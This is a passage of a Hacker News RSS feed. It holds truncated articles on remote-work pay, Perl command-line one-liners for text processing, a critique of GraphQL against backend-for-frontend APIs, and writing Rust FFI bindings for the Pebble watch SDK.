href="https://redditblog.com/2020/10/27/evolving-reddits-workforce/">work from anywhere</a>. They explained why and how in a thoughtful blog post. “<em>To support employees to live where they want to and do their best work, we are eliminating geographic compensation zones in the US”. </em>US employees will get SF/NY salaries, regardless of where they live. Reddit will be able to hire amazing talent from anywhere. Office spaces will be reimagined...</p><p><strong>Zapier offers a delocation package</strong></p><p>Zapier is a remote company that once decided to offer a<a href="https://zapier.com/blog/move-away-from-sf-get-remote-job/"> $10,000 de-location package</a> to anyone keen on moving away from San Francisco in order to work …</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.remotive.io/compensation-for-remote-teams/">https://blog.remotive.io/compensation-for-remote-teams/</a></em></p>]]>
            </description>
            <link>https://blog.remotive.io/compensation-for-remote-teams/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25014811</guid>
            <pubDate>Sat, 07 Nov 2020 12:57:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: eBook with hundreds of Perl one-liners]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25014639">thread link</a>) | @asicsp
<br/>
November 7, 2020 | https://learnbyexample.github.io/learn_perl_oneliners/one-liner-introduction.html | <a href="https://web.archive.org/web/*/https://learnbyexample.github.io/learn_perl_oneliners/one-liner-introduction.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><nav id="sidebar" aria-label="Table of contents"></nav><div id="page-wrapper"><div class="page"><div id="content"><main><p>This chapter will give an overview of <code>perl</code> syntax for command line usage and some examples to show what kind of problems are typically suited for one-liners.</p><h2><a href="#why-use-perl-for-one-liners" id="why-use-perl-for-one-liners">Why use Perl for one-liners?</a></h2><p>I assume you are already familiar with use cases where command line is more productive compared to GUI. See also this series of articles titled <a href="https://sanctum.geek.nz/arabesque/series/unix-as-ide/">Unix as IDE</a>.</p><p>A shell utility like <code>bash</code> provides built-in commands and scripting features to easily solve and automate various tasks. External *nix commands like <code>grep</code>, <code>sed</code>, <code>awk</code>, <code>sort</code>, <code>find</code>, <code>parallel</code>, etc can be combined to work with each other. Depending upon your familiarity with those tools, you can either use <code>perl</code> as a single replacement or complement them for specific use cases.</p><p>Here's some one-liners (options will be explained later):</p><ul><li><code>perl -pe 's/(?:\x27;\x27|";")(*SKIP)(*F)|;/#/g'</code> — change <code>;</code> to <code>#</code> but don't change <code>;</code> within single or double quotes</li><li><code>perl -MList::Util=uniq -e 'print uniq &lt;&gt;'</code> — retain only first copy of duplicated lines, uses built-in module <code>List::Util</code></li><li><code>perl -MRegexp::Common=net -nE 'say join "\n", //g if /$RE{net}{IPv4}/'</code> — extract only IPv4 addresses, using a third-party <a href="https://metacpan.org/pod/Regexp::Common">Regexp::Common</a> module</li><li>Some stackoverflow Q&amp;A that I've answered over the years with simpler <code>perl</code> solution compared to other cli tools <ul><li><a href="https://stackoverflow.com/questions/42554684/shell-replace-string-with-incrementing-value">replace string with incrementing value</a></li><li><a href="https://stackoverflow.com/questions/48920626/sort-rows-in-csv-file-without-header-first-column">sort rows in csv file without header &amp; first column</a></li><li><a href="https://stackoverflow.com/questions/63681983/sed-reverse-matched-pattern">reverse matched pattern</a></li><li><a href="https://stackoverflow.com/questions/49765879/append-zeros-to-list">append zeros to list</a></li><li><a href="https://stackoverflow.com/questions/62241101/arithmetic-replacement-in-a-text-file">arithmetic replacement in a text file</a></li><li><a href="https://stackoverflow.com/questions/45571828/execute-bash-command-inside-awk-and-print-command-output">reverse complement DNA sequence for a specific field</a></li></ul></li></ul><p>The selling point of <code>perl</code> over tools like <code>grep</code>, <code>sed</code> and <code>awk</code> includes feature rich regular expression engine and standard/third-party modules. If you don't already know the syntax and idioms for <code>sed</code> and <code>awk</code>, learning command line options for <code>perl</code> would be the easier option. Another advantage is that <code>perl</code> is more portable compared to GNU, BSD and Mac implementations of cli tools. The main disadvantage is that <code>perl</code> is likely to be slower for features that are supported out of the box by those tools.</p><blockquote><p><img src="https://learnbyexample.github.io/learn_perl_oneliners/images/info.svg" alt="info"> See also <a href="https://unix.stackexchange.com/questions/303044/when-to-use-grep-less-awk-sed">unix.stackexchange: when to use grep, sed, awk, perl, etc</a></p></blockquote><h2><a href="#installation-and-documentation" id="installation-and-documentation">Installation and Documentation</a></h2><p>If you are on a Unix like system, you are most likely to already have some version of Perl installed. See <a href="https://www.cpan.org/src/README.html">cpan: Perl Source</a> for instructions to install the latest <code>perl</code> version from source. <code>perl v5.32.0</code> is used for all the examples shown in this book.</p><p>You can use <code>perldoc</code> command to access documentation from the command line. You can visit <a href="https://perldoc.perl.org/">https://perldoc.perl.org/</a> if you wish to read it online, which also has a handy search feature. Here's some useful links to get started:</p><ul><li><a href="https://perldoc.perl.org/perl#Overview">perldoc: overview</a></li><li><a href="https://perldoc.perl.org/perlintro">perldoc: perlintro</a></li><li><a href="https://perldoc.perl.org/perlfaq">perldoc: faqs</a></li></ul><h2><a href="#command-line-options" id="command-line-options">Command line options</a></h2><p><code>perl -h</code> gives the list of all command line options, along with a brief description. See <a href="https://perldoc.perl.org/perlrun">perldoc: perlrun</a> for documentation on these command switches.</p><table><thead><tr><th><strong>Option</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>-0[octal]</code></td><td>specify record separator (<code>\0</code>, if no argument)</td></tr><tr><td><code>-a</code></td><td>autosplit mode with <code>-n</code> or <code>-p</code> (splits <code>$_</code> into <code>@F</code>)</td></tr><tr><td><code>-C[number/list]</code></td><td>enables the listed Unicode features</td></tr><tr><td><code>-c</code></td><td>check syntax only (runs <code>BEGIN</code> and <code>CHECK</code> blocks)</td></tr><tr><td><code>-d[:debugger]</code></td><td>run program under debugger</td></tr><tr><td><code>-D[number/list]</code></td><td>set debugging flags (argument is a bit mask or alphabets)</td></tr><tr><td><code>-e program</code></td><td>one line of program (several <code>-e</code>'s allowed, omit programfile)</td></tr><tr><td><code>-E program</code></td><td>like <code>-e</code>, but enables all optional features</td></tr><tr><td><code>-f</code></td><td>don't do <code>$sitelib/sitecustomize.pl</code> at startup</td></tr><tr><td><code>-F/pattern/</code></td><td><code>split()</code> pattern for <code>-a</code> switch (<code>//</code>'s are optional)</td></tr><tr><td><code>-i[extension]</code></td><td>edit <code>&lt;&gt;</code> files in place (makes backup if extension supplied)</td></tr><tr><td><code>-Idirectory</code></td><td>specify <code>@INC/#include</code> directory (several <code>-I</code>'s allowed)</td></tr><tr><td><code>-l[octal]</code></td><td>enable line ending processing, specifies line terminator</td></tr><tr><td><code>-[mM][-]module</code></td><td>execute <code>use/no module...</code> before executing program</td></tr><tr><td><code>-n</code></td><td>assume <code>while (&lt;&gt;) { ... }</code> loop around program</td></tr><tr><td><code>-p</code></td><td>assume loop like <code>-n</code> but <code>print</code> line also, like <code>sed</code></td></tr><tr><td><code>-s</code></td><td>enable rudimentary parsing for switches after programfile</td></tr><tr><td><code>-S</code></td><td>look for programfile using <code>PATH</code> environment variable</td></tr><tr><td><code>-t</code></td><td>enable tainting warnings</td></tr><tr><td><code>-T</code></td><td>enable tainting checks</td></tr><tr><td><code>-u</code></td><td>dump core after parsing program</td></tr><tr><td><code>-U</code></td><td>allow unsafe operations</td></tr><tr><td><code>-v</code></td><td>print version, patchlevel and license</td></tr><tr><td><code>-V[:variable]</code></td><td>print configuration summary (or a single <code>Config.pm</code> variable)</td></tr><tr><td><code>-w</code></td><td>enable many useful warnings</td></tr><tr><td><code>-W</code></td><td>enable all warnings</td></tr><tr><td><code>-x[directory]</code></td><td>ignore text before <code>#!perl</code> line (optionally <code>cd</code> to directory)</td></tr><tr><td><code>-X</code></td><td>disable all warnings</td></tr></tbody></table><p>This chapter will show examples with <code>-e</code>, <code>-l</code>, <code>-n</code>, <code>-p</code> and <code>-a</code> options. Some more options will be covered in later chapters, but not all of them are discussed in this book.</p><h2><a href="#executing-perl-code" id="executing-perl-code">Executing Perl code</a></h2><p>If you want to execute a <code>perl</code> program file, one way is to pass the filename as argument to the <code>perl</code> command.</p><pre><code>$ echo 'print "Hello Perl\n"' &gt; hello.pl
$ perl hello.pl
Hello Perl
</code></pre><p>For short programs, you can also directly pass the code as an argument to the <code>-e</code> or <code>-E</code> options. See <a href="https://perldoc.perl.org/feature">perldoc: feature</a> for details about the features enabled by the <code>-E</code> option.</p><pre><code>$ perl -e 'print "Hello Perl\n"'
Hello Perl

$ # multiple statements can be issued separated by ;
$ # -l option will be covered in detail later, appends \n to 'print' here
$ perl -le '$x=25; $y=12; print $x**$y'
59604644775390625
$ # or, use -E and 'say' instead of -l and 'print'
$ perl -E '$x=25; $y=12; say $x**$y'
59604644775390625
</code></pre><h2><a href="#filtering" id="filtering">Filtering</a></h2><p><code>perl</code> one-liners can be used for filtering lines matched by a regexp, similar to <code>grep</code>, <code>sed</code> and <code>awk</code>. And similar to many command line utilities, <code>perl</code> can accept input from both <code>stdin</code> and file arguments.</p><pre><code>$ # sample stdin data
$ printf 'gate\napple\nwhat\nkite\n'
gate
apple
what
kite

$ # print all lines containing 'at'
$ # same as: grep 'at' and sed -n '/at/p' and awk '/at/'
$ printf 'gate\napple\nwhat\nkite\n' | perl -ne 'print if /at/'
gate
what

$ # print all lines NOT containing 'e'
$ # same as: grep -v 'e' and sed -n '/e/!p' and awk '!/e/'
$ printf 'gate\napple\nwhat\nkite\n' | perl -ne 'print if !/e/'
what
</code></pre><p>By default, <code>grep</code>, <code>sed</code> and <code>awk</code> will automatically loop over input content line by line (with <code>\n</code> as the line distinguishing character). The <code>-n</code> or <code>-p</code> option will enable this feature for <code>perl</code>. <a href="https://learnbyexample.github.io/learn_perl_oneliners/using-modules.html#convert-one-liners-to-pretty-formatted-scripts">O module</a> section shows the code Perl runs with these options.</p><p>As seen before, the <code>-e</code> option accepts code as command line argument. Many shortcuts are available to reduce the amount of typing needed. In the above examples, a regular expression (defined by the pattern between a pair of forward slashes) has been used to filter the input. When the input string isn't specified, the test is performed against special variable <code>$_</code>, which has the contents of the current input line here (the correct term would be input <strong>record</strong>, see <a href="https://learnbyexample.github.io/learn_perl_oneliners/record-separators.html#record-separators">Record separators</a> chapter). <code>$_</code> is also the default argument for many functions like <code>print</code> and <code>say</code>. To summarize:</p><ul><li><code>/REGEXP/FLAGS</code> is a shortcut for <code>$_ =~ m/REGEXP/FLAGS</code></li><li><code>!/REGEXP/FLAGS</code> is a shortcut for <code>$_ !~ m/REGEXP/FLAGS</code></li></ul><blockquote><p><img src="https://learnbyexample.github.io/learn_perl_oneliners/images/info.svg" alt="info"> See <a href="https://perldoc.perl.org/perlop#m/PATTERN/msixpodualngc">perldoc: match</a> for help on <code>m</code> operator. See <a href="https://perldoc.perl.org/perlvar#SPECIAL-VARIABLES">perldoc: special variables</a> for documentation on <code>$_</code>, <code>$&amp;</code>, etc.</p></blockquote><p>Here's an example with file input instead of <code>stdin</code>.</p><pre><code>$ cat table.txt
brown bread mat hair 42
blue cake mug shirt -7
yellow banana window shoes 3.14

$ perl -nE 'say $&amp; if /(?&lt;!-)\d+$/' table.txt
42
14

$ # if the condition isn't required, capture groups can be used
$ perl -nE 'say /(\d+)$/' table.txt
42
7
14
</code></pre><blockquote><p><img src="https://learnbyexample.github.io/learn_perl_oneliners/images/info.svg" alt="info"> The <a href="https://github.com/learnbyexample/learn_perl_oneliners/tree/main/example_files">learn_perl_oneliners repo</a> has all the files used in examples (like <code>table.txt</code> in the above example).</p></blockquote><h2><a href="#substitution" id="substitution">Substitution</a></h2><p>Use <code>s</code> operator for search and replace requirements. By default, this operates on <code>$_</code> when the input string isn't provided. For these examples, <code>-p</code> option is used instead of <code>-n</code> option, so that the value of <code>$_</code> is automatically printed after processing each input line. See <a href="https://perldoc.perl.org/perlop#s/PATTERN/REPLACEMENT/msixpodualngcer">perldoc: search and replace</a> for documentation and examples.</p><pre><code>$ # for each input line, change only first ':' to '-'
$ # same as: sed 's/:/-/' and awk '{sub(/:/, "-")} 1'
$ printf '1:2:3:4\na:b:c:d\n' | perl -pe 's/:/-/'
1-2:3:4
a-b:c:d

$ # for each input line, change all ':' to '-'
$ # same as: sed 's/:/-/g' and awk '{gsub(/:/, "-")} 1'
$ printf '1:2:3:4\na:b:c:d\n' | perl -pe 's/:/-/g'
1-2-3-4
a-b-c-d
</code></pre><blockquote><p><img src="https://learnbyexample.github.io/learn_perl_oneliners/images/info.svg" alt="info"> The <code>s</code> operator modifies the input string it is acting upon if the pattern matches. In addition, it will return number of substitutions made if successful, otherwise returns a <em>false</em> value (empty string or <code>0</code>). You can use <code>r</code> flag to return string after substitution instead of in-place modification. As mentioned before, this book assumes you are already familiar with <code>perl</code> regular expressions. If not, see <a href="https://perldoc.perl.org/perlretut">perldoc: perlretut</a> to get started.</p></blockquote><h2><a href="#field-processing" id="field-processing">Field processing</a></h2><p>Consider the sample input file shown below with fields separated by a single space character.</p><pre><code>$ cat table.txt
brown bread mat hair 42
blue cake mug shirt -7
yellow banana window shoes 3.14
</code></pre><p>Here's some examples that is based on specific field rather than the entire line. The <code>-a</code> option will cause the input line to be split based on whitespaces and the field contents can be accessed using <code>@F</code> special array variable. Leading and trailing whitespaces will be suppressed, so there's no possibility of empty fields. More details is discussed in <a href="https://learnbyexample.github.io/learn_perl_oneliners/field-separators.html#default-field-separation">Default field separation</a> section.</p><pre><code>$ # print the second field of each input line
$ # same as: awk '{print $2}' table.txt
$ perl -lane 'print $F[1]' table.txt
bread
cake
banana

$ # print lines only if last field is a negative number
$ # same as: awk '$NF&lt;0' table.txt
$ perl -lane 'print if $F[-1] &lt; 0' table.txt
blue cake mug shirt -7

$ # change 'b' to 'B' only for the first field
$ # same as: awk '{gsub(/b/, "B", $1)} 1' table.txt
$ perl -lane '$F[0] =~ s/b/B/g; print "@F"' table.txt
Brown bread mat hair 42
Blue cake mug shirt -7
yellow banana window shoes 3.14
</code></pre><p>See <a href="https://learnbyexample.github.io/learn_perl_oneliners/field-separators.html#output-field-separator">Output field separator</a> section for details on using array variable inside double quotes.</p><h2><a href="#begin-and-end" id="begin-and-end">BEGIN and END</a></h2><p>You can use a <code>BEGIN{}</code> block when you need to execute something before input is read and a <code>END{}</code> block to execute something after all of the input has been processed.</p><pre><code>$ # same as: awk 'BEGIN{print "---"} 1; END{print "%%%"}'
$ seq 4 | perl -pE 'BEGIN{say "---"} END{say "%%%"}'
---
1
2
3
4
%%%
</code></pre><h2><a href="#env-hash" id="env-hash">ENV hash</a></h2><p>When it comes to automation and scripting, you'd often need to construct commands that can accept input from user, file, output of a shell command, etc. As mentioned before, this book assumes <code>bash</code> as the shell being used. …</p></main></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://learnbyexample.github.io/learn_perl_oneliners/one-liner-introduction.html">https://learnbyexample.github.io/learn_perl_oneliners/one-liner-introduction.html</a></em></p>]]>
            </description>
            <link>https://learnbyexample.github.io/learn_perl_oneliners/one-liner-introduction.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25014639</guid>
            <pubDate>Sat, 07 Nov 2020 12:16:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why not use GraphQL?]]>
            </title>
            <description>
<![CDATA[
Score 448 | Comments 438 (<a href="https://news.ycombinator.com/item?id=25014582">thread link</a>) | @jensneuse
<br/>
November 7, 2020 | https://wundergraph.com/blog/why_not_use_graphql | <a href="https://web.archive.org/web/*/https://wundergraph.com/blog/why_not_use_graphql">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>I think GraphQL will change the world. There will be a future where you can query any system in the world using GraphQL. I'm building this future. So why would I argue against using GraphQL? My personal pet peeve is when the community keeps advertising benefits of GraphQL that are very generic and really have nothing to do with GraphQL. If we want to drive adoption, we should be honest and take off the rose-tinted glasses. This post is a response to "Why use GraphQL" by Kyle Schrade (<a href="https://www.apollographql.com/blog/why-use-graphql/" target="_blank" rel="noopener noreferrer">https://www.apollographql.com/blog/why-use-graphql/</a>). It’s not meant to be direct criticism. The article is just an excellent base to work with as it represents opinions I keep hearing a lot in the community. If you read the whole article, it’ll take some time, you’ll fully understand why I think Kyle’s article should be named “Why use Apollo”.</p><p>If you haven't read Kyles's article already, I think it makes most sense if you read it first: <a href="https://www.apollographql.com/blog/why-use-graphql/" target="_blank" rel="noopener noreferrer">https://www.apollographql.com/blog/why-use-graphql/</a></p><p>The author states that REST APIs come with a set of downsides and how GraphQL solves all of them:
Over-fetching
Multiple requests for multiple resources
Waterfall network requests on nested data
Each client need to know the location of each service</p><p>The first three issues could be solved by writing another REST API as a facade for a specific user interface. Take Next.JS as an example. Next lets you define APIs with a very lightweight syntax. Instead of making multiple requests from the client, you can wrap those calls into an API and make them server-side. Over and underfetching can be solved with this approach too, as you can manipulate the data before sending it back to the client. The pattern described is named "backend for frontend" (BFF). It's not limited to full stack frameworks like Next.JS. You can build a BFF for your mobile apps as well.</p><p>With the BFF pattern, the client itself doesn't have to know the location of each service. However, the developer who implements the BFF needs to understand the service landscape. Hopefully you have Open API Specifications for all your services, nicely presented in a developer portal. If that's the case, it should be easy to write a BFF.</p><p>With GraphQL, there still needs to be a developer who implements the resolvers. Implementing the resolvers is more or less the same task as building a BFF, the logic is very similar. So, what's the real difference?</p><p>The BFF is easier to implement as there's a lot more tooling available. E.g. if you use a framework like Next.JS in combination with swr hooks (stale while revalidate) you get automatic caching with Etags and cache invalidation out of the box. This reduces the amount of data sent between server and client. It's even less data than GraphQL, because you're not sending query payloads and the server responds with 304 (Not Modified) if the response is still valid. Additionally, you don't have to use a heavyweight client like Apollo. The library swr by Vercel is small and very easy to use. It comes with support for pagination, hooks, and helps to navigate back and forth very efficiently.</p><p>GraphQL has persisted queries but it comes with additional overhead to implement this. If you don't use a client like Relay, which persists Queries by default, you have to do it on your own or use some third party library to implement it. Compared to the BFF approach using e.g. Next.JS there's a lot more complexity involved in getting to the same results on the frontend. How would you implement Etags with GraphQL? How do you make your GraphQL server return 304 status codes if nothing changed? Don't you first have to turn all Queries into GET requests? If so, does your GraphQL client and server easily support this?</p><p>When it comes to user experience and ease of development, the BFF is the clear winner. Less data transfer between client and server. Easier to implement. Smaller client, less moving parts.</p><p>But there's a catch. You have to build a BFF for each individual frontend. If you have many of them this can be a lot of work. You have to maintain all the BFFs. You have to operate them. You have to secure them.</p><p>Wouldn't it be nice if you could have the benefits of both without making tradeoffs? This is exactly what WunderGraph is. A framework to build BFFs using GraphQL.</p><p>In the next paragraph, Kyle goes on with the problems involved with versioned APIs. He's absolutely right that having too many versions of an API makes it very hard to keep track of. He then concludes that in GraphQL, there's only one version of the graph and changes can be tracked in a schema registry, a paid feature of Apollo. For that reason you won’t have any problems with versioning, he says.</p><p>I have problems coming to the same conclusion. Just because GraphQL schemas don’t support versioning natively doesn’t mean the problem goes away. You get the same effect if you just don’t version your REST APIs. In fact, many experts say that you should always try to not introduce versions of an API if you don’t have to. That being said, what holds you off running two versions of your GraphQL schema? Not that I think this is a good idea but it's technically possible.</p><p>If having too many versions of your REST APIs is a problem in your organization, before throwing a new tool like GraphQL at the problem, maybe you should have a look at the organization first. What are the reasons for having so many versions? Maybe the change of a process or new team structures can help? GraphQL does absolutely nothing to solve your versioning problems. Instead I think it actually makes the situation worse.</p><p>Do you have to support mobile applications? You should be aware that shipping native apps takes time. You have to wait for app store approval and you can expect many of your users to never (or slowly) install the new version. What if you want to introduce a breaking change in this scenario without breaking a client? It's impossible. You have to introduce this change in a non-breaking way. It would be interesting to hear from Facebook how they avoided breaking clients.</p><p>Evolving your schema in the case of GraphQL would mean, you deprecate the old field and add a new one. New clients use the new field while you hope that the number of clients using the old field will get less and less. Hopefully, you have a system in place that forces your users to download a new version at some point in time. Otherwise, you might be forced to support the deprecated field indefinitely. If that's the case, the deprecation model of GraphQL doesn't help you at all.</p><p>With REST you could create a new endpoint or another version of an existing one. The problem is the same, the solution just looks a bit different.</p><p>To make it clear, if you cannot control your clients you really want some kind of versioning. If all you have is a single web application you won’t need this feature. But then again GraphQL might be overkill as well.</p><p>In this paragraph, the author states that RESTful APIs don't allow partial responses.</p><p>This is just wrong. Here's an example:</p><div><div><div tabindex="0"><div><p><span>GET /users?fields=results(gender,name)</span></p></div></div></div></div><p>What does the author actually mean? I'm pretty sure he's aware of partial responses. I guess what he's trying to say is that someone needs to implement partial responses. Actually, it looks very familiar to GraphQL as you're selecting subfields from a resource. With GraphQL we have this feature out of the box.</p><p>On the other hand, with the BFF approach, you don't need this. Just return exactly the data you need. Again, a full-stack framework like Next.JS makes it simpler to implement this, makes caching easier and gives you Etag based cache invalidation for free.</p><p>To sum this section up, GraphQL gives you exactly the data you need. Partial responses can achieve the same result. BFFs come with the additional cost of implementation and maintenance but have a better UX &amp; DX.</p><p>In this paragraph, Kyle addresses the issues of REST APIs not being strictly typed. He talks about the problems with APIs where it's not clear if you get an array of posts or something different and how query parameters complicate the situation. He also states that GraphQL, because of its strict type system, doesn't have this problem.</p><p>I think what Kyle is talking about is an organizational problem for which you need an organizational solution.</p><p>You have the kind of problems he describes, when you allow developers to deploy REST APIs without publishing Open API Specifications (OAS) or similar. With OAS all resources can be described very easily. OAS also allows you to describe OAuth2 flows and required scopes per endpoint. Additionally, you can describe the exact types and validation rules for query parameters, a feature that GraphQL is lacking.</p><p>Looking at GraphQL, there's no way to describe Authentication, Authorization and input validation. GraphQL is lacking these features because the inventors at Facebook solved this problem at a different layer. There was no need for them to add these features to GraphQL. You can add custom directives to your schema to achieve similar results like OAS but this would be a custom implementation which you have to maintain yourself.</p><p>You might be thinking that OAS doesn't guarantee the response of an API to be compliant with the specification. You would be right. But how does a GraphQL schema guarantee anything?</p><p>GraphQL introspection is the act of sending a specific GraphQL query to the server to get information about the GraphQL schema. The GraphQL server is free to answer with whatever types it wants to. If you send a Query, the server can answer with a response that doesn't adhere to the GraphQL schema from the introspection response. Take Apollo Federation as an example. You upload your schema into a schema registry and then, by error, deploy the wrong version of your GraphQL server. If you change the type of a field, the client might be confused.</p><p>When we talk about type safety in GraphQL, what we actually mean is that we trust in a GraphQL server to behave exactly as advertised by the introspection Query …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://wundergraph.com/blog/why_not_use_graphql">https://wundergraph.com/blog/why_not_use_graphql</a></em></p>]]>
            </description>
            <link>https://wundergraph.com/blog/why_not_use_graphql</link>
            <guid isPermaLink="false">hacker-news-small-sites-25014582</guid>
            <pubDate>Sat, 07 Nov 2020 11:57:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Semantic FFI Bindings in Rust – Reactivating the Borrow Checker]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25014515">thread link</a>) | @lukastyrychtr
<br/>
November 7, 2020 | https://blog.schichler.dev/semantic-ffi-bindings-in-rust-reactivating-the-borrow-checker-ckgxtoxo8057pwrs174dqhcsi | <a href="https://web.archive.org/web/*/https://blog.schichler.dev/semantic-ffi-bindings-in-rust-reactivating-the-borrow-checker-ckgxtoxo8057pwrs174dqhcsi">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><blockquote>
<p>In this post:</p>
<ul>
<li>Rust references, opaque handles and ownership</li>
<li>Likely pitfalls or: <code>c_void</code> isn't (yet) C's <code>void</code></li>
<li>One big caveat</li>
<li>Lifetime-generic opaque references and callbacks</li>
</ul>
<hr>
<ul>
<li>Prerequisites:<br>The Rustonomicon's pages on <a target="_blank" href="https://doc.rust-lang.org/nomicon/safe-unsafe-meaning.html">How Safe and Unsafe Interact</a> and on <a target="_blank" href="https://doc.rust-lang.org/nomicon/ffi.html">FFI</a>  </li>
<li>Optional reading:<br><a target="_blank" href="https://en.cppreference.com/w/c/language/restrict">cppreference.com on the <code>restrict</code> type qualifier</a></li>
</ul>
<hr>
</blockquote>
<p>🎨 <em>The image displayed on my watch is unsafe!Ferris by @‍whoisaldeka on Twitter, first posted <a target="_blank" href="https://twitter.com/whoisaldeka/status/674465785557860353">here</a> under CC-BY... though </em>technically<em> speaking I downscaled the SVG version that's in the Rustonomicon.</em></p>
<p>I recently succeeded at writing a watch app for my old Kickstarter Pebble and made some discoveries in the process that may be interesting to others working on similar projects or FFI bindings in general. This post is part one of a two-part series, with the other (planned to be) covering some tricks you can use when wrapping an OOP C API.</p>

<p>💁‍♂️ <em>Some of the advice in this post hinges on the e.g. <code>nightly-2020-10-30</code> <code>#![feature(extern_types)]</code>. To my knowledge, there is currently no fully sound way to use fully opaque references on stable!<br>Should the feature change, please ping me with a comment and I'll update this post accordingly.</em></p>
<p>A good starting point when writing FFI bindings is to transliterate the original C headers as closely as possible. For example's sake, we'll examine a few functions from <a target="_blank" href="https://developer.rebble.io/developer.pebble.com/docs/c/User_Interface/Window/index.html">this page</a> of the Pebble SDK docs:</p>
<pre><code>
<span>typedef</span> <span><span>struct</span> <span>Layer</span> <span>Layer</span>;</span>
<span>typedef</span> <span><span>struct</span> <span>Window</span> <span>Window</span>;</span>

<span>Window * <span>window_create</span><span>(<span>void</span>)</span></span>;
<span><span>bool</span> <span>window_is_loaded</span><span>(Window * window)</span></span>;
window_set_background_color(Window * window, GColor background_color);
<span>struct Layer * <span>window_get_root_layer</span><span>(<span>const</span> Window * window)</span></span>;
<span><span>void</span> <span>window_destroy</span><span>(Window * window)</span></span>;
</code></pre>
<p>becomes</p>
<pre><code><span>extern</span> <span>"C"</span> {
  <span><span>type</span> <span>Layer</span></span>; 
  <span><span>type</span> <span>Window</span></span>;

  <span><span>fn</span> <span>window_create</span></span>() -&gt; *<span>mut</span> Window;
  <span><span>fn</span> <span>window_is_loaded</span></span>(window: *<span>mut</span> Window) -&gt; <span>bool</span>;
  <span><span>fn</span> <span>window_set_background_color</span></span>(window: *<span>mut</span> Window, background_color: GColor);
  <span><span>fn</span> <span>window_get_root_layer</span></span>(window: *<span>const</span> Window) -&gt; *<span>mut</span> Layer;
  <span><span>fn</span> <span>window_destroy</span></span>(window: *<span>mut</span> Window);
}
</code></pre>
<p><a target="_blank" href="https://github.com/rust-lang/rust/issues/43467">Extern types</a> have a few useful properties, like not implementing <em>any</em> of the auto-traits by default. They are considered fully thread-unsafe and panic-unsafe, unless you explicitly specify otherwise. We're dealing with a watch that doesn't support threading at all, and also doesn't know exceptions beyond bailing from a faulty app, so for the most part we'll ignore this aspect.</p>
<p>A more interesting, and unique, property is that references (<code>&amp;</code> and <code>&amp;mut</code>) to extern types are FFI-safe as slim pointers while the type itself is considered unsized.<br>Rust normally really likes to reorganise the backing storage of references: Small values passed by reference can be "inlined" and passed by value instead, if that produces faster or smaller code. Even data behind a mutable reference can be copied and later written back due to <a target="_blank" href="https://doc.rust-lang.org/nomicon/aliasing.html">Rust's strict aliasing rules</a>. However, if the size of the data isn't known, it <em>can't:</em></p>
<h3 id="rust-preserves-pointer-identity-of-references-to-extern-types">Rust preserves pointer identity of references to extern types!</h3>
<p>That's it, that's the post.</p>
<p>⋮</p>
<p>No, not really. There are a few finer points to take care of here. You may have noticed that I didn't cite any of the non-code documentation. (Examples aren't necessary exact copies from here on out.)</p>
<pre><code>
<span>Window * <span>window_create</span><span>(<span>void</span>)</span></span>;


<span><span>void</span> <span>window_destroy</span><span>(Window * window)</span></span>;
</code></pre>
<p>Hm... So this window creation function is actually fallible, but <code>window_destroy</code> expects a valid Window handle 🤔<br>We couldn't tell from the signature alone because in C, all pointers are nullable. The developers would have had to compromise on convenience and/or write unidiomatic code to avoid this. That <code>window_create</code> can fail but <code>window_destroy</code> expects an actual instance makes sense too: This API is the same across all watch generations that were made, which includes my "aplite" with only 100kB RAM in total, and only 24kB for app executable and heap combined. Creating too many Windows <strong>will</strong> fail eventually.<br>Apps will usually configure their windows, so it's more efficient to assume they will branch once after creation than making every other function accept null pointers. On a low power device, that's a sensible design in my opinion.</p>
<p>In any case, the first binding above lets us write the following unsound code without a complaint from the compiler:</p>
<pre><code><span>unsafe</span> { window_destroy(window_create()) } 
</code></pre>
<p>That's a <a target="_blank" href="https://en.wikipedia.org/wiki/Segmentation_fault#Null_pointer_dereference">segfault</a> in the making.</p>
<p>Can we do better? In stable Rust, the answer is "somewhat":</p>
<pre><code><span><span>struct</span> <span>Layer</span></span>([<span>u8</span>; <span>0</span>]); 
<span><span>struct</span> <span>Window</span></span>([<span>u8</span>; <span>0</span>]);

<span>extern</span> <span>"C"</span> {
  <span><span>fn</span> <span>window_create</span></span>() -&gt; <span>Option</span>&lt;NonNull&lt;Window&gt;&gt;;
  <span><span>fn</span> <span>window_is_loaded</span></span>(window: NonNull&lt;Window&gt;) -&gt; <span>bool</span>;
  <span><span>fn</span> <span>window_set_background_color</span></span>(window: NonNull&lt;Window&gt;, background_color: GColor);
  <span><span>fn</span> <span>window_get_root_layer</span></span>(window: NonNull&lt;Window&gt;) -&gt; NonNull&lt;Layer&gt;;
  <span><span>fn</span> <span>window_destroy</span></span>(window: NonNull&lt;Window&gt;);

  
  <span><span>fn</span> <span>layer_destroy</span></span>(window: NonNull&lt;Layer&gt;);
}
</code></pre>
<p>It's a bit awkward, but <a target="_blank" href="https://doc.rust-lang.org/stable/core/ptr/struct.NonNull.html"><code>NonNull</code></a> is FFI-safe and tells us precisely when the pointer points to actual memory.
We lost the <code>const</code> qualifier on <code>window_get_root_layer</code>'s argument, but that's an okay tradeoff to avoid a hard-to-debug segfault.</p>
<p>We can now use the bindings like this:</p>
<pre><code><span>unsafe</span> {
  <span>let</span> window = window_create().unwrap(); 
  window_set_background_color(window, GREEN);
  <span>let</span> layer = window_get_root_layer(window);
  
  <span>if</span> !window_is_loaded(window) {
    window_destroy(window);
  }
  
  window_destroy(window); 
  layer_destroy(layer); 
}
</code></pre>
